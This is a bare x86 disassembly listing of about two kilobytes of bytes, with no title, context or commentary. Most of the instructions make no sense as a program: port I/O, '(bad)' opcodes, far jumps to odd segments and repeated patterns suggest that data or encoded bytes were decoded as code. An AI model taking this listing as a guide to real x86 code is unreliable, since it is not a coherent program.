  423cc6:	xor    BYTE PTR [edi+0x76],0x50
  423cca:	out    0x56,eax
  423ccc:	push   eax
  423ccd:	ja     0x423d31
  423ccf:	jl     0x423d48
  423cd1:	xor    ch,0x24
  423cd4:	outs   dx,DWORD PTR ds:[esi]
  423cd5:	cmp    BYTE PTR [eax-0xf7fa989],al
  423cdb:	push   esi
  423cdc:	push   ebx
  423cdd:	cld    
  423cde:	push   ebx
  423cdf:	adc    DWORD PTR [edx-0x414dd67c],esi
  423ce5:	or     al,0xff
  423ce7:	mov    dl,0x50
  423ce9:	ja     0x423d31
  423ceb:	xor    BYTE PTR [edi+0x56],0x80
  423cef:	lock push esi
  423cf1:	push   ebx
  423cf2:	cld    
  423cf3:	push   ebx
  423cf4:	adc    DWORD PTR [edx-0x414dd67c],esi
  423cfa:	or     al,0xff
  423cfc:	mov    dl,0x50
  423cfe:	ja     0x423caf
  423d00:	jl     0x423d79
  423d02:	jp     0x423d4d
  423d04:	and    al,0x6f
  423d06:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d0a:	fisub  WORD PTR [edi+ebp*2]
  423d0d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d13:	push   esi
  423d14:	push   ebx
  423d15:	cld    
  423d16:	push   ebx
  423d17:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d1d:	sub    edi,edi
  423d1f:	mov    dl,0x80
  423d21:	lock push ds
  423d23:	arpl   bp,di
  423d25:	or     DWORD PTR [edi],ecx
  423d27:	pop    ss
  423d28:	in     al,dx
  423d29:	lea    ecx,[ebp-0x72f35f42]
  423d2f:	lea    eax,[eax+0x77807af0]
  423d35:	jp     0x423cb7
  423d37:	xchg   edi,eax
  423d38:	inc    esi
  423d39:	push   ebx
  423d3a:	je     0x423d8f
  423d3c:	push   ecx
  423d3d:	mov    dl,0x86
  423d3f:	or     al,0xb2
  423d41:	mov    edx,0x80fdff29
  423d46:	ja     0x423d66
  423d48:	inc    ebx
  423d49:	sti    
  423d4a:	push   ebx
  423d4b:	jb     0x423d98
  423d4d:	add    eax,0x80af7750
  423d52:	ja     0x423cd8
  423d54:	xor    al,0x84
  423d57:	push   ebx
  423d58:	cld    
  423d59:	push   ebx
  423d5a:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d60:	sub    edi,edi
  423d62:	mov    dl,0x80
  423d64:	lock scas eax,DWORD PTR es:[edi]
  423d66:	arpl   bp,di
  423d68:	fst    DWORD PTR [edi]
  423d6a:	xor    BYTE PTR [edi-0x7c],0x80
  423d6e:	lock test BYTE PTR [ebx-0x4],dl
  423d72:	push   ebx
  423d73:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d79:	or     al,0xff
  423d7b:	mov    dl,0x50
  423d7d:	ja     0x423d2e
  423d7f:	xor    BYTE PTR [edi+0x7a],0x80
  423d83:	lock jp 0x423dd9
  423d86:	cld    
  423d87:	push   ebx
  423d88:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d8e:	or     al,0xff
  423d90:	mov    dl,0x80
  423d92:	lock scas eax,DWORD PTR es:[edi]
  423d94:	or     DWORD PTR [edx],esp
  423d96:	mov    dl,0x50
  423d98:	ja     0x423d49
  423d9a:	xor    BYTE PTR [edi+0x56],0x80
  423d9e:	lock push esi
  423da0:	push   ebx
  423da1:	cld    
  423da2:	push   ebx
  423da3:	adc    DWORD PTR [edx-0x7b4df342],esi
  423da9:	sub    edi,edi
  423dab:	mov    dl,0x80
  423dad:	lock scas eax,DWORD PTR es:[edi]
  423daf:	arpl   bp,di
  423db1:	or     DWORD PTR [edi],ecx
  423db3:	(bad)  
  423db4:	or     al,0x8d
  423db6:	lea    eax,[eax+0x7750af77]
  423dbc:	scas   eax,DWORD PTR es:[edi]
  423dbd:	xor    BYTE PTR [edi+0x46],0xec
  423dc1:	ja     0x423e25
  423dc3:	push   eax
  423dc4:	out    0x3e,eax
  423dc6:	push   eax
  423dc7:	ja     0x423e27
  423dc9:	pop    esi
  423dca:	cmc    
  423dcb:	and    al,0x6f
  423dcd:	cmp    BYTE PTR [eax+0x77],dl
  423dd0:	push   0x7c
  423dd2:	ja     0x423e3a
  423dd4:	hlt    
  423dd5:	and    al,0x6f
  423dd7:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423ddb:	repz and al,0x6f
  423dde:	cmp    BYTE PTR [eax+0x77],dl
  423de1:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423deb:	adc    DWORD PTR [edx-0x414dd67c],esi
  423df1:	or     al,0xff
  423df3:	mov    dl,0x50
  423df5:	ja     0x423df4
  423df7:	sub    BYTE PTR [edx-0x42],0x4f
  423dfb:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e01:	dec    edi
  423e02:	xor    DWORD PTR [ebp+0x4d],ecx
  423e05:	dec    ebp
  423e06:	jmp    0x7c6a:0x80386f24
  423e0d:	dec    edi
  423e0e:	jge    0x423e5d
  423e10:	dec    ebp
  423e11:	dec    ebp
  423e12:	or     esp,DWORD PTR [edi+ebp*2]
  423e15:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e1b:	ja     0x423e14
  423e1d:	xor    al,0xf7
  423e20:	push   ebx
  423e21:	cld    
  423e22:	push   ebx
  423e23:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e29:	or     al,0xff
  423e2b:	mov    dl,0x80
  423e2d:	lock std 
  423e2f:	or     DWORD PTR [edx],esp
  423e31:	mov    dl,0x80
  423e33:	lock pop esi
  423e35:	(bad)  
  423e36:	out    dx,al
  423e37:	out    dx,eax
  423e38:	adc    BYTE PTR [edi-0x54],dh
  423e3b:	sub    BYTE PTR [edx-0x80],0x77
  423e3f:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423e49:	or     al,0xb2
  423e4b:	test   BYTE PTR [ecx],ch
  423e4d:	push   DWORD PTR [edx+0x9fdf080]
  423e53:	and    dh,BYTE PTR [edx-0x7f990f80]
  423e59:	xchg   edi,eax
  423e5a:	push   bx
  423e5c:	push   ecx
  423e5d:	push   ebx
  423e5e:	xchg   esp,eax
  423e5f:	mov    dl,0xba
  423e61:	sub    DWORD PTR [edx-0x100f3f9],esi
  423e67:	in     al,dx
  423e68:	mov    dl,0x80
  423e6a:	lock pop esi
  423e6c:	or     eax,esp
  423e6e:	and    edi,ebp
  423e70:	or     BYTE PTR [edi+0x31],0x4d
  423e74:	dec    ebp
  423e75:	dec    ebp
  423e76:	sbb    BYTE PTR [eax],0x31
  423e79:	dec    ebp
  423e7a:	dec    ebp
  423e7b:	dec    ebp
  423e7c:	push   ebx
  423e7d:	cld    
  423e7e:	push   ebx
  423e7f:	xchg   esp,eax
  423e80:	mov    dl,0x84
  423e82:	sub    DWORD PTR [edx-0x400f3f9],esi
  423e88:	in     al,dx
  423e89:	mov    dl,0x9
  423e8b:	loopne 0x423e7d
  423e8d:	lods   al,BYTE PTR ds:[esi]
  423e8e:	push   ebx
  423e8f:	std    
  423e90:	adc    al,dh
  423e92:	lods   al,BYTE PTR ds:[esi]
  423e93:	sub    BYTE PTR [edx-0x71],0x77
  423e97:	lods   al,BYTE PTR ds:[esi]
  423e98:	xor    al,0xf7
  423e9b:	adc    BYTE PTR [edi+0x535153f7],0x94
  423ea2:	mov    dl,0x7
  423ea4:	or     al,0xb2
  423ea6:	mov    edx,0x80feff29
  423eab:	xchg   edi,eax
  423eac:	std    
  423ead:	or     DWORD PTR [edx],esp
  423eaf:	inc    BYTE PTR [eax-0x11efa169]
  423eb5:	push   cs
  423eb6:	sub    BYTE PTR [edx-0x80],0x77
  423eba:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423ec4:	sub    DWORD PTR [edx-0x4d00f342],esi
  423eca:	xor    al,0xfd
  423ecd:	or     DWORD PTR [edx],esp
  423ecf:	mov    dl,0x80
  423ed1:	lock pop esi
  423ed3:	(bad)  
  423ed4:	out    dx,al
  423ed5:	out    dx,eax
  423ed6:	adc    BYTE PTR [edi-0x54],dh
  423ed9:	sub    BYTE PTR [edx-0x80],0x77
  423edd:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423ee7:	adc    DWORD PTR [edx-0x4d00f342],esi
  423eed:	xor    al,0xfd
  423ef0:	or     DWORD PTR [edx],esp
  423ef2:	mov    dl,0x80
  423ef4:	lock push 0xffffff80
  423ef7:	xchg   edi,eax
  423ef8:	push   0x53
  423efa:	push   ecx
  423efb:	push   ebx
  423efc:	xchg   esp,eax
  423efd:	mov    dl,0xba
  423eff:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f05:	in     al,dx
  423f06:	mov    dl,0x80
  423f08:	lock pop esi
  423f0a:	or     eax,esp
  423f0c:	and    edi,ebp
  423f0e:	or     BYTE PTR [edi+0x7d],0x4d
  423f12:	dec    ebp
  423f13:	dec    ebp
  423f14:	sbb    BYTE PTR [eax],0x7d
  423f17:	dec    ebp
  423f18:	dec    ebp
  423f19:	dec    ebp
  423f1a:	push   ebx
  423f1b:	cld    
  423f1c:	push   ebx
  423f1d:	xchg   esp,eax
  423f1e:	mov    dl,0x84
  423f20:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f26:	in     al,dx
  423f27:	mov    dl,0x9
  423f29:	loopne 0x423f1b
  423f2b:	lods   al,BYTE PTR ds:[esi]
  423f2c:	push   ebx
  423f2d:	std    
  423f2e:	adc    al,dh
  423f30:	lods   al,BYTE PTR ds:[esi]
  423f31:	sub    BYTE PTR [edx-0x71],0x77
  423f35:	lods   al,BYTE PTR ds:[esi]
  423f36:	xor    al,0xf7
  423f39:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f40:	mov    dl,0x7
  423f42:	or     al,0xb2
  423f44:	mov    edx,0x80feff29
  423f49:	xchg   edi,eax
  423f4a:	std    
  423f4b:	or     DWORD PTR [edx],esp
  423f4d:	inc    BYTE PTR [eax-0x11efa169]
  423f53:	push   cs
  423f54:	sub    BYTE PTR [edx-0x80],0x77
  423f58:	es xor al,0x26
  423f5c:	push   ebx
  423f5d:	adc    DWORD PTR [ebx-0x4],edx
  423f60:	mov    dl,0xbe
  423f62:	or     al,0xb2
  423f64:	test   BYTE PTR [ecx],ch
  423f66:	push   DWORD PTR [edx-0x7f950f80]
  423f6c:	xchg   edi,eax
  423f6d:	push   0x53
  423f6f:	push   ecx
  423f70:	push   ebx
  423f71:	xchg   esp,eax
  423f72:	mov    dl,0xba
  423f74:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f7a:	or     DWORD PTR [edx],esp
  423f7c:	mov    dl,0xec
  423f7e:	ja     0x423f7d
  423f80:	push   eax
  423f81:	ja     0x423f80
  423f83:	xor    BYTE PTR [edi-0x3],0x80
  423f87:	lock scas eax,DWORD PTR es:[edi]
  423f89:	arpl   bp,di
  423f8b:	or     edx,ebp
  423f8d:	(bad)  
  423f8e:	or     eax,0x77804d4d
  423f93:	push   0xffffff80
  423f95:	lock push 0x53
  423f98:	adc    DWORD PTR [edx-0x3acf342],esi
  423f9e:	mov    dl,0x84
  423fa0:	sub    edi,edi
  423fa2:	mov    dl,0x80
  423fa4:	lock scas eax,DWORD PTR es:[edi]
  423fa6:	or     DWORD PTR [edx],esp
  423fa8:	mov    dl,0x80
  423faa:	lock ds push ebx
  423fad:	push   ecx
  423fae:	mov    dl,0xba
  423fb0:	sub    edi,edi
  423fb2:	mov    dl,0x80
  423fb4:	lock ds push ebx
  423fb7:	adc    DWORD PTR [edx-0x4d00f342],esi
  423fbd:	push   eax
  423fbe:	ja     0x424026
  423fc0:	xor    BYTE PTR [edi-0x7e],0x80
  423fc4:	lock adc BYTE PTR [ebx+0x11],0xb2
  423fc9:	mov    esi,0xb2fc530c
  423fce:	test   BYTE PTR [ecx],ch
  423fd0:	push   DWORD PTR [edx-0x7f7d0f80]
  423fd6:	xchg   edi,eax
  423fd7:	adc    BYTE PTR [ebx+0x51],0xb2
  423fdb:	mov    edx,0xb2945329
  423fe0:	pop    es
  423fe1:	or     al,0xff
  423fe3:	(bad)  
  423fe4:	in     al,dx
  423fe5:	lock data16 in al,dx
  423fe8:	std    
  423fe9:	in     al,dx
  423fea:	lock inc esi
  423fec:	push   eax
  423fed:	lock inc esi
  423fef:	les    ebx,FWORD PTR ds:0x80827780
  423ff5:	lock adc BYTE PTR [ebx-0x4],0x53
  423ffa:	adc    DWORD PTR [edx-0x414dd67c],esi
  424000:	or     al,0xff
  424002:	mov    dl,0xec
  424004:	ja     0x42404c
  424006:	push   eax
  424007:	ja     0x42404f
  424009:	xor    BYTE PTR [edi-0x7e],0x80
  42400d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424012:	test   BYTE PTR [ecx],ch
  424014:	push   ebx
  424015:	adc    DWORD PTR [edx-0x4d00f342],esi
  42401b:	xor    al,0x1e
  42401e:	inc    ebx
  42401f:	std    
  424020:	xor    BYTE PTR [edi-0x7e],0x80
  424024:	xchg   edi,eax
  424025:	adc    BYTE PTR [ebx-0x4],0x53
  424029:	xchg   esp,eax
  42402a:	mov    dl,0x7
  42402c:	or     al,0xb2
  42402e:	test   BYTE PTR [ecx],ch
  424030:	(bad)  
  424031:	sti    
  424032:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  424039:	mov    dl,0x9
  42403b:	dec    esp
  42403c:	xor    cl,BYTE PTR [edx+0x77804d4d]
  424042:	out    dx,eax
  424043:	dec    ebp
  424044:	xlat   BYTE PTR ds:[ebx]
  424045:	and    DWORD PTR [ecx],eax
  424047:	ja     0x423fcf
  424049:	dec    ebp
  42404a:	xlat   BYTE PTR ds:[ebx]
  42404b:	out    dx,eax
  42404c:	or     al,BYTE PTR [eax-0x327f1089]
  424052:	jp     0x42408e
  424054:	lea    ecx,[ebp+0x7780814d]
  42405a:	out    dx,eax
  42405b:	or     ch,0xf7
  42405e:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  424064:	xlat   BYTE PTR ds:[ebx]
  424065:	mov    cl,BYTE PTR [ebp-0x29]
  424068:	jbe    0x423ff0
  42406a:	test   eax,0x508d8def
  42406f:	ja     0x4240d3
  424071:	xor    BYTE PTR [edi-0x75],0x80
  424075:	lock mov edx,DWORD PTR [ebx+0x74]
  424079:	push   ebx
  42407a:	push   ecx
  42407b:	mov    dl,0xba
  42407d:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424083:	xor    al,0x76
  424086:	arpl   WORD PTR [edx+0x778057d5],si
  42408c:	out    dx,eax
  42408d:	xor    al,0x2e
  424090:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  424097:	lea    ecx,[ebp+0x7e531153]
  42409d:	mov    dl,0xbe
  42409f:	or     al,0xb2
  4240a1:	clc    
  4240a2:	sub    edi,edi
  4240a4:	(bad)  
  4240a5:	xchg   esi,eax
  4240a6:	xor    al,0x8b
  4240a9:	adc    BYTE PTR [edi+0x5311538b],0x7e
  4240b0:	mov    dl,0xbe
  4240b2:	or     al,0xb2
  4240b4:	clc    
  4240b5:	sub    edi,edi
  4240b7:	(bad)  
  4240b8:	xchg   esi,eax
  4240b9:	dec    ebp
  4240ba:	xlat   BYTE PTR ds:[ebx]
  4240bb:	jbe    0x42410a
  4240bd:	or     bl,BYTE PTR ds:0x70a3a9ab
  4240c3:	sti    
  4240c4:	out    dx,eax
  4240c5:	lea    edx,[edi-0x78127880]
  4240cb:	and    eax,0x80328099
  4240d0:	mov    ds:0x8d8d3a2e,al
  4240d5:	in     eax,dx
  4240d6:	pop    ebp
  4240d7:	lea    ecx,[ecx]
  4240d9:	(bad)  
  4240db:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  4240e1:	(bad)  
  4240e3:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  4240e9:	jne    0x80cfce7c
  4240ef:	dec    esp
  4240f0:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  4240f6:	or     DWORD PTR [edi],ecx
  4240f8:	mov    esp,0xed8d8d8d
  4240fd:	cli    
  4240fe:	inc    ecx
  4240ff:	lea    ecx,[ebp+0xf09718d]
  424105:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42410b:	push   ebp
  42410c:	or     DWORD PTR [edi],ecx
  42410e:	mov    dh,0x8d
  424110:	lea    ecx,[ebp+0x3a268e80]
  424116:	lea    ecx,[ebp-0x72cd4813]
  42411c:	cmp    dh,0x43
  42411f:	mov    eax,ds:0x5c09fbec
  424124:	or     ah,BYTE PTR [ecx]
  424126:	push   eax
  424127:	lock stc 
  424129:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  42412d:	in     al,dx
  42412e:	dec    BYTE PTR [ecx]
  424130:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  424137:	adc    eax,0x86f05093
  42413c:	cli    
  42413d:	dec    ebp
  42413e:	dec    ebp
  42413f:	dec    ebp
  424140:	jmp    0x4240dd
  424142:	dec    edi
  424143:	outs   dx,BYTE PTR ds:[esi]
  424144:	aad    0xeb
  424146:	or     BYTE PTR [esi],0xed
  424149:	mov    bh,0xc8
  42414b:	lea    esi,[ebx]
  42414d:	jle    0x42413b
  42414f:	test   DWORD PTR [ecx],0x9a1e65c
  424155:	pop    esp
  424156:	scas   al,BYTE PTR es:[edi]
  424157:	and    esp,ebp
  424159:	push   es
  42415a:	aad    0xbf
  42415c:	add    edx,ebx
  42415e:	adc    eax,0x4f87f050
  424163:	outs   dx,BYTE PTR ds:[esi]
  424164:	aad    0x92
  424166:	xor    BYTE PTR [eax],0xed
  424169:	mov    bh,0x8b
  42416b:	lea    esi,[ebx]
  42416d:	push   ecx
  42416e:	in     al,dx
  42416f:	std    
  424170:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  424174:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  424178:	in     al,dx
  424179:	push   es
  42417a:	aad    0x43
  42417c:	add    edi,ebx
  42417e:	adc    eax,0x808ae750
  424183:	out    0x8a,eax
  424185:	sub    BYTE PTR [ebx+0x4f],0x4d
  424189:	aad    0x6f
  42418b:	and    BYTE PTR [edi-0x73dac507],0x9
  424192:	pop    esp
  424193:	fbld   TBYTE PTR [ecx+0x219f5c09]
  424199:	dec    ebp
  42419a:	ja     0x424127
  42419c:	in     eax,dx
  42419d:	ja     0x424129
  42419f:	out    dx,eax
  4241a0:	in     al,dx
  4241a1:	push   es
  4241a2:	pop    edi
  4241a3:	out    0x8b,eax
  4241a5:	in     al,0xa4
  4241a7:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  4241ab:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  4241af:	xor    al,0x87
  4241b2:	dec    ebp
  4241b3:	ja     0x42417d
  4241b5:	in     eax,dx
  4241b6:	mov    dl,0xef
  4241b8:	in     al,dx
  4241b9:	push   es
  4241ba:	push   eax
  4241bb:	lock xchg DWORD PTR [edi-0x19],ebx
  4241bf:	enter  0x2ee4,0x80
  4241c3:	lock xchg BYTE PTR [ecx],cl
  4241c6:	pop    esp
  4241c7:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  4241cd:	dec    ebp
  4241ce:	ja     0x424202
  4241d0:	in     eax,dx
  4241d1:	mov    dl,0xef
  4241d3:	in     al,dx
  4241d4:	pushf  
  4241d5:	push   eax
  4241d6:	lock xchg BYTE PTR [edi-0x69],bl
  4241da:	xor    cl,BYTE PTR [ecx]
  4241dc:	jmp    0xa3ab:0x4d4d4d9a
  4241e3:	push   ebx
  4241e4:	push   0x6d
  4241e6:	les    ecx,FWORD PTR [ebx+edx*2]
  4241e9:	push   0xffffffa9
  4241eb:	jo     0x424261
  4241ed:	xchg   edi,eax
  4241ee:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  4241f5:	lea    eax,[eax-0x7812de89]
  4241fb:	jno    0x424190
  4241fd:	push   ebx
  4241fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241ff:	cdq    
  424200:	fwait
  424201:	pop    edi
  424202:	pop    ds
  424203:	or     DWORD PTR [edi],ecx
  424205:	jmp    0xd574:0x638d8d8d
  42420c:	call   0xd81fdf70
  424211:	das    
  424212:	push   ebx
  424213:	push   0x6d
  424215:	(bad)  
  424216:	fld    DWORD PTR [eax+0x77ecdd6d]
  42421c:	out    dx,eax
  42421d:	cmp    BYTE PTR [ebp+0x25],0x80
  424221:	or     dh,BYTE PTR ds:0x80155280
  424227:	fstp   QWORD PTR ds:0xeceff0ec
  42422d:	xchg   edi,eax
  42422e:	out    dx,eax
  42422f:	push   eax
  424230:	xlat   BYTE PTR ds:[ebx]
  424231:	mov    ah,BYTE PTR [ebx+0x4b]
  424234:	fucomi st,st(4)
  424236:	push   eax
  424237:	out    0x8a,eax
  424239:	push   eax
  42423a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42423b:	mov    ebx,DWORD PTR [edi-0x59]
  42423e:	mov    bl,cl
  424240:	mov    dh,0x63
  424242:	popf   
  424243:	adc    eax,0x5c096fd3
  424248:	push   ebp
  424249:	scas   al,BYTE PTR es:[edi]
  42424a:	les    ecx,FWORD PTR [eax+eax*4]
  42424d:	mov    BYTE PTR [ecx],0x55
  424250:	mov    es,WORD PTR [eax-0x2ab2b097]
  424256:	aas    
  424257:	in     al,dx
  424258:	out    0xef,eax
  42425a:	push   eax
  42425b:	out    0x32,eax
  42425d:	arpl   WORD PTR [ebx-0x587f8e27],cx
  424263:	and    DWORD PTR [eax-0x7d131a5d],eax
  424269:	arpl   WORD PTR [esi],ax
  42426b:	shr    esi,cl
  42426d:	sbb    BYTE PTR [ecx-0x3c],0xef
  424271:	inc    ebx
  424272:	out    0xef,eax
  424274:	push   eax
  424275:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  42427f:	mov    esi,DWORD PTR [ebx+0x50]
  424282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424283:	mov    esp,DWORD PTR [ebx-0x59]
  424286:	mov    ah,ah
  424288:	pop    esi
  424289:	(bad)  
  42428a:	into   
  42428b:	push   ebx
  42428c:	push   0xffffffab
  42428e:	test   eax,0xeffb70a3
  424293:	lea    edx,[edi-0x78127880]
  424299:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  4242a3:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  4242a7:	cmc    
  4242a8:	and    al,0x6f
  4242aa:	cmp    BYTE PTR [eax-0x587f7510],al
  4242b0:	mov    bl,BYTE PTR [ebx+0x52010de2]
  4242b6:	cmp    dl,BYTE PTR [ebx+0x51]
  4242b9:	mov    dl,0xbe
  4242bb:	or     al,0xab
  4242bd:	push   ebx
  4242be:	lods   al,BYTE PTR ds:[esi]
  4242bf:	mov    dl,0xb4
  4242c1:	sub    edi,edi
  4242c3:	adc    DWORD PTR [eax-0x10],edx
  4242c6:	xchg   BYTE PTR [eax-0xf7f7510],al
  4242cc:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242d2:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242d8:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242de:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242e4:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  4242e8:	fsincos 
  4242ea:	lods   al,BYTE PTR ds:[esi]
  4242eb:	pop    eax
  4242ec:	xor    al,0x8a
  4242ef:	and    BYTE PTR [edi+0x53ac538a],0x51
  4242f6:	mov    dl,0xb4
  4242f8:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  4242fe:	and    BYTE PTR [edi+0x2e248021],0x3a
  424305:	lea    ecx,[ebp+0xf09ff63]
  42430b:	sbb    ah,ch
  42430d:	lea    ecx,[ebp-0x7f750f80]
  424313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424314:	mov    dl,BYTE PTR [ebx+0x51]
  424317:	push   ebx
  424318:	lods   al,BYTE PTR ds:[esi]
  424319:	mov    dl,0xbe
  42431b:	or     al,0xb2
  42431d:	mov    ah,0x29
  42431f:	call   DWORD PTR [ecx]
  424321:	arpl   si,di
  424323:	or     DWORD PTR [edi],ecx
  424325:	jecxz  0x424313
  424327:	lea    ecx,[ebp-0x72327080]
  42432d:	lea    ecx,[ebp-0x7f756880]
  424333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424334:	mov    dl,BYTE PTR [ebx+0x7e]
  424337:	push   ebx
  424338:	lods   al,BYTE PTR ds:[esi]
  424339:	mov    dl,0x7
  42433b:	or     al,0xb2
  42433d:	mov    ah,0x29
  42433f:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  424346:	in     al,dx
  424347:	lea    ecx,[ebp+0x50eff0ec]
  42434d:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  424358:	pop    es
  424359:	or     al,0xb2
  42435b:	mov    ah,0x29
  42435d:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  424364:	xor    ah,BYTE PTR [ebx-0x9]
  424367:	aad    0x27
  424369:	xor    BYTE PTR [edi-0x76],0x80
  42436d:	xchg   edi,eax
  42436e:	mov    dl,BYTE PTR [ebx-0x64]
  424371:	push   ebx
  424372:	cld    
  424373:	mov    dl,0xf8
  424375:	sub    DWORD PTR [edx-0x400f37a],esi
  42437b:	adc    BYTE PTR [edi+0x1572c332],0x5f
  424382:	out    dx,al
  424383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424384:	xlat   BYTE PTR ds:[ebx]
  424385:	rol    BYTE PTR [eax-0x687f7589],0x8a
  42438c:	push   ebx
  42438d:	pushf  
  42438e:	push   ebx
  42438f:	cld    
  424390:	mov    dl,0xf8
  424392:	sub    DWORD PTR [edx-0x400f37a],esi
  424398:	adc    BYTE PTR [edi+0x1572c332],0x5f
  42439f:	jne    0x424347
  4243a1:	jno    0x4243ac
  4243a3:	push   gs
  4243a5:	or     al,0x8d
  4243a7:	lea    eax,[eax+0x77808a77]
  4243ad:	mov    al,BYTE PTR [eax+0x77808aa7]
  4243b3:	mov    dl,BYTE PTR [ebx+0x7c]
  4243b6:	push   ebx
  4243b7:	add    al,0xb2
  4243b9:	test   BYTE PTR [ecx],ch
  4243bb:	mov    dl,0xc4
  4243bd:	or     al,0xff
  4243bf:	add    BYTE PTR [eax+0x6ac33277],0x15
  4243c6:	in     al,dx
  4243c7:	mov    dl,0x80
  4243c9:	jge    0x42443c
  4243cb:	in     al,dx
  4243cc:	lock out dx,eax
  4243ce:	push   eax
  4243cf:	lock test BYTE PTR [eax-0x687f7510],al
  4243d6:	mov    dl,BYTE PTR [ebx+0x51]
  4243d9:	push   ebx
  4243da:	pushf  
  4243db:	mov    dl,0xbe
  4243dd:	or     al,0xb2
  4243df:	clc    
  4243e0:	sub    edi,edi
  4243e2:	inc    BYTE PTR [eax-0xfaf7569]
  4243e8:	jp     0x42436a
  4243ea:	out    dx,eax
  4243eb:	push   eax
  4243ec:	lock stc 
  4243ee:	xor    al,0x8a
  4243f1:	push   ebx
  4243f2:	jle    0x424447
  4243f4:	sub    dh,BYTE PTR [edx+0x7b229ba]
  4243fa:	or     al,0xff
  4243fc:	mov    dh,0x80
  4243fe:	lock stc 
  424400:	arpl   si,di
  424402:	aad    0x6f
  424404:	in     al,dx
  424405:	lock out dx,eax
  424407:	push   eax
  424408:	lock jp 0x42438b
  42440b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424412:	push   ebx
  424413:	pushf  
  424414:	mov    dl,0xbe
  424416:	or     al,0xb2
  424418:	clc    
  424419:	sub    edi,edi
  42441b:	(bad)  
  42441c:	in     al,dx
  42441d:	jge    0x424440
  42441f:	jl     0x424498
  424421:	xor    cl,0x24
  424424:	outs   dx,DWORD PTR ds:[esi]
  424425:	cmp    ah,ch
  424427:	lock out dx,eax
  424429:	push   eax
  42442a:	lock xchg esp,eax
  42442d:	in     al,dx
  42442e:	xor    al,0x87
  424431:	xor    BYTE PTR [edi+0x21],0x80
  424435:	int    0x32
  424437:	cmp    cl,BYTE PTR [ebp+0x714d968d]
  42443d:	xor    BYTE PTR [edi+0x21],0x4d
  424441:	xlat   BYTE PTR ds:[ebx]
  424442:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  424448:	lea    ecx,[ebp+0xa]
  42444b:	and    DWORD PTR [edi+esi*2-0x7d],edi
  42444f:	add    dl,ch
  424451:	cs jne 0x4244d0
  424454:	ja     0x4243d9
  424456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424457:	push   ss
  424458:	outs   dx,DWORD PTR ds:[esi]
  424459:	cmp    BYTE PTR [eax-0x687f7510],al
  42445f:	mov    dl,BYTE PTR [ebx+0x51]
  424462:	push   ebx
  424463:	pushf  
  424464:	mov    dl,0xbe
  424466:	or     al,0xb2
  424468:	clc    
  424469:	sub    edi,edi
  42446b:	(bad)  
  42446c:	push   eax
  42446d:	ja     0x424468
  42446f:	arpl   bp,di
  424471:	xlat   BYTE PTR ds:[ebx]
  424472:	pop    ecx
  424473:	xor    BYTE PTR [edi-0x75],0x80
  424477:	lock mov edx,DWORD PTR [ebx-0x4]
  42447b:	push   ebx
  42447c:	sub    dh,BYTE PTR [edx-0x794dd646]
  424482:	or     al,0xff
  424484:	mov    dl,0x80
  424486:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  42448e:	push   ecx
  42448f:	mov    dl,0xf8
  424491:	sub    esp,ebp
  424493:	add    BYTE PTR [eax-0x327fde89],0x32
  42449a:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  4244a0:	push   DWORD PTR [esi-0x556bddf7]
  4244a6:	dec    ebp
  4244a7:	or     dh,BYTE PTR ds:0x808a7780
  4244ad:	lock mov dl,BYTE PTR [ebx-0x4]
  4244b1:	push   ebx
  4244b2:	sub    dh,BYTE PTR [edx-0x454df37a]
  4244b8:	sub    edi,edi
  4244ba:	mov    dl,0x63
